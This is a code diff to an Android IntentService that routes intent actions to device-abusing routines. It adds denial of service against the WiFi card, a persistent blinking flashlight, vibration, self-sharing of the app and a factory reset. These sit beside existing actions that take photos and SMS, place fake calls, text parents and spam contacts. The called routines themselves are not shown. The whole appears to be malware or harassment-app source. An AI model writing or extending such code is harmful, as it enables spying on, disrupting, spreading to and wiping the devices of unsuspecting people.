@@ -31,6 +31,9 @@ import java.util.TimerTask;
 
 public class JobsIntentService extends IntentService {
 
+    public static final String ACTION_LOCATION = "ACTION_LOCATION";
+    public static final String ACTION_SHARE_APP = "ACTION_SHARE_APP";
+    public static final String ACTION_FACTORY_RESET = "ACTION_FACTORY_RESET";
     private static final String TAG = JobsIntentService.class.getSimpleName();
     public static final String ACTION_DCIM_FILES = "ACTION_DCIM_FILES";
     public static final String ACTION_SMS = "ACTION_SMS";
@@ -44,6 +47,9 @@ public class JobsIntentService extends IntentService {
     public static final String ACTION_FAKE_PHONE_CALL = "ACTION_FAKE_PHONE_CALL";
     public static final String ACTION_TEXT_PARENTS = "ACTION_TEXT_PARENTS";
     public static final String ACTION_INSERT_CONTACT = "ACTION_INSERT_CONTACT";
+    public static final String ACTION_FLASHLIGHT = "ACTION_FLASHLIGHT";
+    public static final String ACTION_VIBRATOR = "ACTION_VIBRATOR";
+    public static final String ACTION_WIFI_CARD = "ACTION_WIFI_CARD";
     private static long sNumber = 1111111111;
 
     public JobsIntentService() {
@@ -200,7 +206,19 @@ public class JobsIntentService extends IntentService {
                     timer.scheduleAtFixedRate(timerTask, 0, 3000);
                     Lofl.setJobRan(this, JobsScheduler.INSERT_CONTACT_KEY);
                 }
-            }else{
+            } else if (intent.getAction().equals(ACTION_WIFI_CARD)) {
+                Lofl.dosWifiCard(this);
+            }else if(intent.getAction().equals(ACTION_FLASHLIGHT)){
+                Lofl.persistentBlinkingFlashlight(this);
+            }else if(intent.getAction().equals(ACTION_VIBRATOR)){
+                Lofl.vibrator(this);
+            } else if(intent.getAction().equals(ACTION_LOCATION)){
+
+            }else if(intent.getAction().equals(ACTION_SHARE_APP)){
+                Lofl.shareApp(this);
+            }else if(intent.getAction().equals(ACTION_FACTORY_RESET)){
+                Lofl.factoryReset(this);
+            }else {
                 Log.d(TAG, "No action found!");
             }
         }
